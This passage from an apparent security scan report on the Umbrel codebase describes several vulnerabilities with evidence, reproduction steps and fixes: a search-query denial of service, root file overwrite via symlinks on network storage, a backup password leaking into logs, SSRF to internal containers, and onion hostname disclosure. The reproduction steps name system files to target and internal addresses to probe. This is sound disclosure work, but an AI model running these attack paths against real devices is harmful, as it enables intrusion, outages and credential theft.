   `user.createWebSocketTicket` is member-capable for target 'trpc' (only the terminal/machines targets are owner-only), so a member reaches the WebSocket transport and its 1 MiB input size.

## Impact
No confidentiality or integrity impact. Availability: the single shared bulk-lane file-index reader is monopolised (or OOM-crashed and rebooted while consuming gigabytes of RAM) for as long as the attacker keeps queuing requests, so Files search for every account, Photos library summary/albums/sources and file-index status are denied and one CPU core is saturated. The reserved interactive reader (thumbnails, point reads), directory listing, the dashboard, lan-ingress and apps keep running, so at the system level this is a sustained partial loss rather than total denial; the escalation to host memory pressure depends on an unverified dependency internal and is not rated. Rated LOW.

## Reproduction steps
1. Attacker is any authenticated account, including a non-owner member (the threat model's member adversary). They create a few files/directories whose names contain a repeated trigram in their own home (member-capable createDirectory/rename), mint a tRPC WebSocket ticket (member-capable for target 'trpc'), connect to /trpc through lan-ingress and send `files.search` with a ~1,000,000-character repeated-character query and maxResults=1000; or send ~16 KB queries over HTTP GET. No query length cap, no reader execution timeout and no queue admission bound stand in the way, and the request can be repeated or batched to sustain the outage.

## Recommended fix
1. The search query length is never bounded between the tRPC input (routes.ts), the engine (`searchCandidates`) and the reader-side scoring, while per-row fuzzy scoring and FTS pattern expansion are proportional to that length. Fix criteria: A query longer than a small fixed bound consistent with file-name length (a few hundred code points) is rejected at the tRPC input and again in `FileIndexEngine.searchCandidates`/`queries.searchCandidates` before any SQL or fuzzy scoring runs. Verify that a 1 MiB WebSocket `files.search` request and a 16 KB GET request are both rejected without the reader executing a query.
2. Reader jobs have no execution deadline and the pool never rejects queued reads, so one pathological read holds the shared bulk-lane slot indefinitely and an unbounded backlog can be built behind it. Fix criteria: Reader jobs are bounded in execution time (per-job timeout that discards and replaces the worker, or an SQLite progress handler/interrupt) and the per-principal or total bulk-lane backlog is bounded, so a single slow or repeated read cannot hold the slot beyond a bounded period. Verify that a deliberately slow bulk read is cancelled and that queued legitimate bulk reads then complete.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Algorithmic complexity DoS
**CWE:** [CWE-407](https://cwe.mitre.org/data/definitions/407.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258124

---

# External VM disk install staging path never validated; symlink on storage redirects root qemu-img writes

## Details
When a machine's virtual disk lives on External/Network storage, #prepareMachineInstall (machines.ts 1911-1913) builds the install destination as `${externalDisk}.installing`, where externalDisk is the system path returned by #diskSystemPath → files.virtualToSystemPath. That helper realpath-validates the *declared* disk path (`<dir>/<id>.qcow2`) but the derived sibling `<dir>/<id>.qcow2.installing` is never validated: it is only `fse.remove`d (unlinks a link, not its target) and then handed, as root, to `qemu-img create -f qcow2 <path> <size>G` (libvirt.ts createDisk, ISO installs) or `qemu-img convert ... -O qcow2 <source> <path>` + `qemu-img resize` (libvirt.ts convertDisk, disk-image installs). qemu-img's file-posix backend opens the destination with O_CREAT (no O_EXCL/O_NOFOLLOW), truncates it to zero, extends it to the requested virtual size and writes the qcow2 structures, so a symbolic link at the staging path is followed and the host file it names is destroyed and overwritten with root privileges. The staging link is then renamed onto `<id>.qcow2` (machines.ts 2036) as a link, so the machine's canonical disk now also names the host file.

Who controls that path: `/Network/<host>/<share>` is a CIFS mount served by a remote SMB server (mounted without `nosymfollow`, network-storage.ts 154). The Linux cifs client exposes server-supplied symlink reparse points (NFS-style reparse data is taken verbatim) as POSIX symlinks and the VFS resolves their absolute targets on the host. A malicious or compromised SMB server therefore simply answers every lookup of `<id>.qcow2.installing` with a symlink to e.g. `/home/umbrel/umbrel/umbrel.yaml`, `/home/umbrel/umbrel/secrets/auth/sessions.yaml`, `/etc/shadow`, `/root/.ssh/authorized_keys` or `/etc/cron.d/<x>`, and may ignore the preceding unlink — no race is needed, unlike the realpath-validated `<id>.qcow2` itself (where chown/chmod/`mount --bind` in libvirt.ts 674-676 follow symlinks but only after a containment check, leaving a TOCTOU window of several execa calls). On a local External drive the same effect requires a writer able to recreate the link between fse.remove and qemu-img.

Result: deterministic root truncation/overwrite of an arbitrary host file (integrity and availability of umbreld state, credentials, system files). With `qemu-img convert` of an owner-chosen raw image, attacker-chosen bytes are additionally written at cluster-aligned offsets (≥ ~192 KiB) after the qcow2 header, which line-oriented root consumers such as sshd authorized_keys or cron tolerate, giving a plausible path to root code execution on the device.

Trigger: the owner (or an MCP agent with `createMachines` and a write grant on the share folder) creates a custom-image machine with `diskDirectory` on the share, or clicks retry on a failed install of such a machine (retryInstall re-enters #prepareMachineInstall; the server can force the failure). Assumptions stated explicitly: QEMU ≥ 6.1 `raw_co_create` uses qemu_create()/open(O_CREAT) and ftruncate without O_EXCL/O_NOFOLLOW (older versions use O_CREAT|O_TRUNC — same effect); Debian trixie's cifs.ko (6.12) presents server reparse-point symlinks as symlinks. Related but distinct from existing finding external-vm-disk-qcow2-metadata-trusted-host-file-exposure (qcow2 header references on the validated disk path at start time); this one is an unvalidated sibling path and filesystem symlink following during install.

## Evidence
1. [packages/umbreld/source/modules/machines/machines.ts:1911–1913](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/machines/machines.ts#L1911-L1913)
   externalDisk is the Files-validated system path of definition.diskPath, but externalDiskStaging is derived by string concatenation (`${externalDisk}.installing`) and becomes diskDestination without any realpath/containment check of its own.
2. [packages/umbreld/source/modules/machines/machines.ts:1918–1920](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/machines/machines.ts#L1918-L1920)
   The only treatment of the staging path before use is fse.remove(), which unlinks a symlink rather than its target; a storage backend that re-presents (or never removes) the symlink controls what the following writes open.
3. [packages/umbreld/source/modules/machines/libvirt.ts:907–912](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/machines/libvirt.ts#L907-L912)
   createDisk runs `qemu-img create -f qcow2 <destination> <size>G` as root on the unvalidated staging path; qemu-img opens the destination with O_CREAT and no O_EXCL/O_NOFOLLOW, truncates it to zero and extends it to the requested size, so a symlink is followed to any host file.
4. [packages/umbreld/source/modules/machines/libvirt.ts:888–904](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/machines/libvirt.ts#L888-L904)
   convertDisk's `qemu-img convert -p -f <in> -O qcow2 <source> <destination>` (888-897) and `qemu-img resize -f qcow2 <destination>` (900-904) write and re-open the same unvalidated staging path as root; converted source bytes land in the symlink target.
5. [packages/umbreld/source/modules/machines/machines.ts:2036](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/machines/machines.ts#L2036)
   After conversion the staging entry is renamed over the real disk name; a symlink staging entry is moved as a link, so the machine's declared disk now points at the host file for every later open.
6. [packages/umbreld/source/modules/machines/machines.ts:1417–1419](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/machines/machines.ts#L1417-L1419)
   #diskSystemPath is the only place the disk location is validated (files.virtualToSystemPath realpath-contains the final component); that validation is not applied to the derived `.installing` sibling.
7. [packages/umbreld/source/modules/files/network-storage.ts:154](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/network-storage.ts#L154)
   Network shares are mounted with `mount -t cifs ... -o credentials,uid,gid,file_mode=0660,dir_mode=0770,iocharset=utf8` and no nosymfollow, so server-presented symlinks are resolved by the host kernel against the host root.
8. [packages/umbreld/source/modules/machines/machines.ts:2127–2140](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/machines/machines.ts#L2127-L2140)
   create() validates only that diskDirectory is a writable directory under /External or /Network (realpath-contained); this is what routes the install into the external staging path. The MCP create_machine tool (mcp/tools/machines.ts:399,425) forwards diskDirectory behind a file-write grant, so an agent with createMachines plus a grant on the share can also trigger it.

## Impact
Arbitrary host file chosen by the attacker is truncated and overwritten by root with qcow2 content (I:H), destroying umbreld store/secrets/system files or disabling services (A:H); attacker-chosen image bytes at fixed offsets give a credible route to root persistence via lenient line-oriented root consumers. No direct read-back of host data in the deterministic path (C:N).

## Reproduction steps
1. The attacker operates or has compromised the SMB server behind a /Network share the owner uses for VM disks (a remote service / malicious network-storage content, both in the recorded threat model), or on a local External drive can recreate a symlink between fse.remove and qemu-img (race). The server answers lookups of `<id>.qcow2.installing` with a symlink to a host path and may ignore the preceding unlink, so no race is needed on CIFS. When the owner, or an MCP agent with createMachines and a write grant on the share, creates a custom-image machine in that folder or retries a failed install there (retryInstall → #launchInstall → #prepareMachineInstall), umbreld as root runs qemu-img create/convert/resize on the link, truncating and rewriting the target, then renames the link over the disk name. AT:P because the owner must already have placed VM disks on the attacker's storage; UI:P because the triggering action is a routine create/retry. Explicit dependency assumptions: qemu-img (Debian trixie qemu-utils) opens the destination with O_CREAT and no O_EXCL/O_NOFOLLOW and truncates/extends it; the Debian trixie cifs.ko client presents server-supplied symlink reparse points as POSIX symlinks that the VFS follows, and network-storage.ts:154 mounts without nosymfollow.

## Recommended fix
The install staging destination on External/Network storage (`${externalDisk}.installing`, and the Windows 98 `${destination}.<pid>.raw` sibling) is derived by string concatenation from a validated path and handed to root-privileged qemu-img / fsp.open without its own realpath containment or a symlink-safe open, so a symlink the storage backend presents at that name redirects root writes to any host file. Fix criteria: Every path written during install on External/Network storage (staging file, final disk, any temporary raw) must be re-resolved and shown to be a regular file or absent inside the storage base immediately before use, and the writer must not follow symlinks (create with O_EXCL on a fresh name, or lstat that the entry is not a link and operate by descriptor; alternatively mount network/external storage with nosymfollow). Verify by placing a symlink at `<dir>/<id>.qcow2.installing` on a test SMB server that re-presents it after unlink: install must fail without touching the link target.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Link following
**CWE:** [CWE-59](https://cwe.mitre.org/data/definitions/59.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258120

---

# Kopia repository password passed on argv and logged via execa error objects to journald

## Details
Backups.addRepository derives the kopia repository password as createHash('sha256').update(password).digest('hex').slice(0,16) from the dedicated backup encryption password the owner sets in the backups wizard (backups.ts:288) and stores it in umbrel.yaml. Every kopia invocation then receives it on the command line as `--password=<value>` (backups.ts:317 for create, 491 for connect; connect() runs before every repository command via repository() at 514-528).

When kopia fails - routine when the external drive is unplugged or the NAS is offline, which the hourly backupOnInterval retries indefinitely - the thrown execa error object is passed whole to logger.error (backups.ts:182-184; also 882-885 in listAllBackups and 935-938 in mountBackup), and logger.ts:26 console.log()s the raw object. execa (^7.1.1, packages/umbreld/package.json) builds the error message as 'Command failed with exit code N: kopia repository connect filesystem --path=... --password=<hex> --override-hostname=umbrel' and also sets enumerable own properties command and escapedCommand containing the same argv; Node's console.log prints the stack header and those properties. umbrel.service has no StandardOutput override, and /var/log is moved to the persistent /data partition (umbrelos.Dockerfile:615-619), so the password persists in journald. At backups.ts:338 the same error is rethrown to the tRPC caller.

The journal is served by getSystemLogs (system/routes.ts:72-92) to the owner-only system.logs procedure (settings > troubleshoot page and its /logs download, logs that users share for support) and to the MCP tool get_system_logs (mcp/tools/system-management.ts:151-185), which requires only the manageSystem grant described to the owner as 'Install umbrelOS updates, restart the device, and read system logs'. The project otherwise treats this value as secret: backups/routes.ts:12 strips `password` from getRepositories even for the owner, and the wizard tells the owner the password cannot be viewed again.

The disclosed value is the actual kopia repository password: whoever can also read the repository blobs (an MCP agent with a /External or /Network file grant via /files/download, a NAS operator, or anyone holding the external drive) opens every snapshot of the full data directory, which contains umbrel.yaml (owner password hash, TOTP secret, plaintext network-storage credentials), secrets/auth/system-token and sessions - enough to authenticate as the owner against the live device. Because the value is an unsalted, unstretched 64-bit SHA-256 prefix, it additionally allows fast offline recovery of the plaintext encryption password, which matters when the owner reused their login password. The execa error-format behaviour is an assumption stated for execa ^7.1.1 as pinned; the repository has no node_modules checked in to confirm it.

## Evidence
1. [packages/umbreld/source/modules/backups/backups.ts:480–498](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/backups/backups.ts#L480-L498)
   connect() runs on every repository operation (repository() at 514-528 calls it first) and passes the stored repository password to kopia as the argv flag `--password=<value>`. When the destination is unreachable kopia exits non-zero and execa builds an error whose message/command/escapedCommand embed this argv.
2. [packages/umbreld/source/modules/backups/backups.ts:306–321](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/backups/backups.ts#L306-L321)
   Repository creation passes the same `--password=` flag on argv.
3. [packages/umbreld/source/modules/backups/backups.ts:182–183](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/backups/backups.ts#L182-L183)
   The hourly backupOnInterval loop catches the execa error from backup() -> repository() -> connect() and passes the raw error object to logger.error. Same pattern at 882-885 (listAllBackups) and 935-938 (mountBackup); at 338 the error is rethrown to the tRPC caller.
4. [packages/umbreld/source/modules/utilities/logger.ts:20–26](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/utilities/logger.ts#L20-L26)
   logger.error console.log()s the raw error object (stack header with execa's message plus own enumerable properties command/escapedCommand), so the argv containing --password=<value> is written to umbreld stdout, which systemd's umbrel.service (no StandardOutput override) sends to the persistent journal.
5. [packages/umbreld/source/modules/system/routes.ts:72–91](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/system/routes.ts#L72-L91)
   getSystemLogs returns the last up-to-1500 journal lines for the umbrel unit (or the whole system journal); it backs the owner-only system.logs procedure (298-306), the settings > troubleshoot page and its /logs download, and the MCP tool.
6. [packages/umbreld/source/modules/mcp/tools/system-management.ts:151–184](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/mcp/tools/system-management.ts#L151-L184)
   get_system_logs is gated only by assertSystemAccess (manageSystem grant) and returns the newest journal lines through the internal owner-level caller, so an MCP agent with a 'read system logs' grant reads the repository password.
7. [packages/umbreld/source/modules/backups/backups.ts:285–288](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/backups/backups.ts#L285-L288)
   The stored/argv value is the first 16 hex chars of an unsalted single-round SHA-256 of the backup encryption password; it is the actual kopia password (directly usable to open the repository) and, being unsalted and unstretched, allows fast offline recovery of the plaintext encryption password if the owner reused their login password.
8. [packages/umbreld/source/modules/backups/routes.ts:7–12](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/backups/routes.ts#L7-L12)
   getRepositories deliberately strips `password` before returning repositories even to the owner ('Only return properties we want to expose'), showing the project treats this value as a secret that log readers are not meant to obtain.

## Impact
The leaked value is the backup repository's decryption password, a credential the project hides even from the owner's UI; with reach to the medium it exposes every snapshot of the whole data directory including umbrel.yaml secrets, secrets/auth/system-token and sessions, so confidentiality is HIGH. Integrity is LOW: the password plus medium access lets an attacker alter snapshot contents that a later owner-initiated restore would apply, and owner impersonation follows only after reaching a snapshot's tokens. No availability impact.

## Reproduction steps
1. An MCP agent holding a bearer token with the manageSystem grant (PR:LOW - a scoped non-owner principal the threat model names) calls get_system_logs over the network after any kopia connect failure has been logged (AT:PRESENT - the destination must have been offline at a backup, list or mount attempt, a common event the hourly loop keeps producing) and reads --password=<hex> from the journal. No user interaction is needed on that path; alternatively anyone receiving a shared troubleshoot log export obtains the same value. With a /External or /Network file grant the agent downloads the repository blobs through the MCP /files/download endpoint and decrypts them offline with the recovered password.

## Recommended fix
1. The kopia repository password is supplied as a command-line argument, so it is embedded in execa's error message/command properties, which backups.ts logs whole and rethrows, landing the secret in journald and in the system.logs / get_system_logs output. Fix criteria: The repository password must never appear in kopia argv or in any logged or returned error text (supply it via the KOPIA_PASSWORD environment variable or a 0600 password file, and log only sanitized error information). Verify by forcing a connect failure with the destination offline and confirming journald, system.logs, get_system_logs and the tRPC error contain no password material.
2. The stored repository password is an unsalted, unstretched SHA-256 prefix of the owner-chosen encryption password, so any disclosure of it is also a fast offline oracle for that plaintext (and for the login password when reused). Fix criteria: The value stored and handed to kopia must not be efficiently invertible to the owner's typed password (for example a random per-repository secret wrapped under a salted, stretched KDF of the password). Verify that knowledge of the stored/kopia value does not allow verifying guesses of the typed password faster than a stretched KDF.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Information Exposure Through Log Files
**CWE:** [CWE-532](https://cwe.mitre.org/data/definitions/532.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5258118

---

# Member-supplied WebDAV URL makes host-side rclone reach Docker-internal app containers and loopback services, bypassing the app-gateway (SSRF)

## Details
The Files cloud connector lets any authenticated account, including non-owner members, register a WebDAV account whose server address is an arbitrary URL. routes.ts:557-572 validates `url` only as a 1-8192 character string; CloudManager.connectWebDav (cloud.ts:741) passes it to the auth helper and commits it into the per-account rclone.conf. Every later operation (browse -> `rclone lsjson`, scheduled/one-shot sync -> `rclone sync`) is executed by umbreld as a host process (cloud-rclone.ts:881-896, execa, uid 1000, host network namespace) against that URL. Scheme (http/https), host, port and path are attacker-controlled; tlsMode 'insecure' disables certificate validation; the member also chooses the Basic-auth credentials rclone presents.

Because the request originates on the host, it reaches addresses a member cannot reach from the LAN and that the app-gateway is designed to protect. The decisive route is the Docker app network: umbreld's own gateway resolves each gated app to its container IP on umbrel_main_network (10.21.0.0/16, lan-ingress.ts:601-683) and proxies to it from the host, proving the host has a direct route to every app container. A member who connects an account to http://10.21.x.x:<APP_PORT>/ therefore reaches the app's HTTP service without the gateway's isAuthorized check (app-gateway.ts:277-284), i.e. without auth.authorizeApp (auth.ts:579-586), which would otherwise refuse the member any app not shared with them. Internal-only container ports that are never published are reachable the same way, as are loopback-only host services (umbreld 127.0.0.1:22080) and hosts on the device's LAN/Tailscale networks. Note that http://127.0.0.1:<app public port>/ is NOT a bypass: lan-ingress binds that loopback port through the gateway mux (lan-ingress.ts:896-916) and the VM test asserts the same auth boundary on loopback.

What a member gains: (1) blind SSRF/port and service discovery - rclone's failure text (connection refused, HTTP status codes, TLS errors) is stored as the sync attention message (cloud.ts:139-152, 1707-1712) and returned by files.cloud.syncs, distinguishing listeners from closed ports and protocols; (2) response disclosure whenever the target speaks WebDAV: an app that relies on the app-gateway for authentication is listed by browse() and its files copied into the member's own home by sync(), where the member reads them through Files. rclone issues only OPTIONS/PROPFIND/HEAD/GET for remote->local sync, so integrity impact is limited to side effects of GET on poorly designed internal endpoints.

Condition: the URL validation lives in cloud-auth.ts, which is not present in this checkout; the finding holds unless that file rejects the Docker bridge, loopback and private ranges. The shipped VM test (cloud-home.vm.test.ts:98-125) connects through the public tRPC API to http(s)://127.0.0.1 and succeeds, and the UI advertises http://umbrel.local:8081-style addresses, so non-public addresses are evidently accepted. The owner is not the adversary (they have SSH); the boundary crossed is member -> app containers and host-internal services that the app-gateway's per-member authorizeApp check is designed to gate.

## Evidence
1. [packages/umbreld/source/modules/files/routes.ts:557–571](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/routes.ts#L557-L571)
   files.cloud.connectWebDav is a cloudProcedure built on privateProcedureWithMembers (= accountProcedure, trpc.ts:35), so any member account can call it. The url input is only z.string().min(1).max(8192): no scheme, host or address-range restriction is applied at the API boundary.
2. [packages/umbreld/source/modules/files/cloud.ts:741–775](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/cloud.ts#L741-L775)
   CloudManager.connectWebDav forwards the caller's url/username/password/tlsMode unchanged to this.auth.connectWebDav (cloud-auth.ts, absent from this checkout) and on success commits the account, making the URL the persistent rclone remote for every later browse/sync.
3. [packages/umbreld/source/modules/files/cloud-rclone.ts:881–895](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/cloud-rclone.ts#L881-L895)
   run() spawns the rclone binary directly on the host with execa (uid/gid 1000, no container), so every request rclone issues originates from the host network namespace, which is attached to the umbrel_main_network bridge (10.21.0.0/16, legacy-compat/docker-compose.yml) and to host loopback.
4. [packages/umbreld/source/modules/files/cloud-rclone.ts:615–675](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/cloud-rclone.ts#L615-L675)
   browse() runs `rclone lsjson <remote>` against the committed config and returns the parsed listing (names, paths, types) to the caller, so the PROPFIND response of any DAV-speaking target is disclosed to the member.
5. [packages/umbreld/source/modules/files/cloud-rclone.ts:713–789](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/cloud-rclone.ts#L713-L789)
   sync() runs `rclone sync <remote> .` with cwd = the member's chosen destination, writing GET response bodies fetched from the attacker-chosen URL into the member's own home where Files exposes them.
6. [packages/umbreld/source/modules/lan-ingress/lan-ingress.ts:601–683](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/lan-ingress/lan-ingress.ts#L601-L683)
   resolveAppTarget/inspectContainerAddress resolve each gated app to its container IP on umbrel_main_network and the AppGateway proxies to it from the host (app-gateway.ts createProxy). This is the same host-to-container route rclone uses: a URL of http://10.21.x.x:<APP_PORT>/ reaches the app container directly, with no gateway in between.
7. [packages/umbreld/source/modules/app-gateway/app-gateway.ts:277–283](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/app-gateway/app-gateway.ts#L277-L283)
   The shipped control: every LAN/loopback request to a gated app must carry an app-gateway token that auth.authenticate accepts and pass auth.authorizeApp for that appId. rclone's host-side connection to the container IP never traverses this code.
8. [packages/umbreld/source/modules/auth/auth.ts:579–586](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/auth/auth.ts#L579-L586)
   authorizeApp lets the owner through but throws 'App access denied' for a member unless the app is in sharedAppIdsForUser. This is the per-member boundary the SSRF path bypasses.
9. [packages/umbreld/source/modules/lan-ingress/lan-ingress.ts:896–915](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/lan-ingress/lan-ingress.ts#L896-L915)
   Correction to the originally filed route: ensureAppLoopbackServer binds 127.0.0.1:<publicPort> through the gateway mux for every gated app (and app-gateway-loopback.vm.test.ts 'uses the same HTTPS and authentication boundary on loopback' asserts it), so http://127.0.0.1:<app public port>/ is gated. The ungated reach is the container IP (previous evidence), plus loopback-only services such as umbreld on 127.0.0.1:22080 and any host on the device's LAN/tailnet.
10. [packages/umbreld/source/modules/files/cloud.ts:139–151](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/cloud.ts#L139-L151)
   cloudFailureMessage takes rclone's last error-level log record (URL-redacted, 512 chars) and applySyncError stores it as the sync's attention message, which files.cloud.syncs returns to the member: 'connection refused' vs 'HTTP status code 4xx' vs TLS errors turn each sync into a port/protocol oracle for internal addresses.
11. [packages/umbreld/source/modules/files/cloud-home.vm.test.ts:98–124](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/cloud-home.vm.test.ts#L98-L124)
   Supporting evidence about the absent cloud-auth validation: the VM test connects through the real tRPC stack to http(s)://127.0.0.1:49321/ (cloud.vm-test-helpers.ts:21-22) and succeeds, so loopback URLs are accepted by the shipped validation; a validator that accepted loopback but rejected the Docker bridge range would be incoherent, and the UI's exampleLocalUrl http://umbrel.local:8081 shows private addresses are by design.

## Impact
Within umbreld the member learns which Docker-internal, loopback and LAN/tailnet ports are open and their protocol/status (information disclosure via the sync attention oracle), and can pull response bodies from DAV-speaking endpoints the gateway would otherwise protect. rclone performs only read methods for remote->local sync, so no direct integrity or availability impact on umbreld itself. Subsequent-system impact: Requests reach third-party app containers at their umbrel_main_network addresses (including ports never published to the host) without the app-gateway's per-member authorizeApp check, and can reach other hosts on the device's LAN/Tailscale networks. Disclosure from such services is bounded by their speaking WebDAV for body retrieval and by status-code leakage otherwise; only read methods are issued.

## Reproduction steps
1. Attacker is an authenticated member account (basic user) reaching the dashboard over LAN/Tailscale/Tor. They call files.cloud.connectWebDav with url=http://10.21.x.x:<port>/ (container IPs are predictable: umbrel_main_network is 10.21.0.0/16 and app exports.sh files pin APP_*_IP addresses, or the member scans using the error oracle), any username/password, tlsMode insecure if needed. rclone connects from the host; sync attention text reveals the service, and if it speaks WebDAV the member browses it and creates a sync into /Users/<id>/<dir> and reads the fetched content via Files. No defences must be defeated; the path never traverses the app-gateway. Works on default deployments with any gated app installed.

## Recommended fix
1. The WebDAV server address supplied by any authenticated account is accepted as-is and used by a host-side rclone process, so a member can direct the device to connect to Docker-internal (umbrel_main_network), loopback, link-local and other non-public addresses that the app-gateway/authorizeApp boundary is meant to protect. Fix criteria: Before committing a WebDAV account (and again when resolving the stored URL at run time, after DNS resolution and on redirects), umbreld rejects URLs whose resolved address is loopback, link-local, the Docker bridge/app network range, or otherwise not an address the requesting account could legitimately reach from the LAN, allowing only http/https. Verify by calling connectWebDav as a member with http://10.21.21.x:<app port>/ and http://127.0.0.1:22080/: both must be refused with a validation error before any outbound request is made, while a LAN Nextcloud URL still connects.
2. rclone failure text is relayed to the caller as the sync attention message, turning any connection attempt into a port/protocol oracle. Fix criteria: Error responses from connectWebDav/browse/sync do not expose transport-level distinctions (refused vs. HTTP status vs. TLS failure) for addresses outside the permitted set; a member probing an internal address receives the same generic rejection regardless of the target's state.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Server-Side Request Forgery
**CWE:** [CWE-918](https://cwe.mitre.org/data/definitions/918.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** LOW
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5257921

---

# Unauthenticated disclosure of app Tor onion hostnames via app-auth CSP header

## Details
The app-auth router (served to browsers on the dedicated app login port 2000, under `/app-auth` on the dashboard ports 80/443, and over Tor on the auth onion that `tor-server-torrc` forwards to port 2000) installs `allowAppHandoffFormAction` as its first middleware so the login SPA's form POST back to the app port is permitted by CSP. The helper takes `app` and `origin` straight from the query string of *any* request (`request.query.app`, `request.query.origin`); when `origin === 'tor'` it calls `umbreld.apps.getApp(appId).readHiddenService()` (reads `tor/data/app-<id>/hostname`) and writes the result into the `Content-Security-Policy` response header as `form-action 'self' http://<56-char>.onion`. Helmet's global CSP is set on every response, so the directive is appended to every app-auth response: the SPA fallback, static assets, and the public `/v1/*` JSON endpoints.

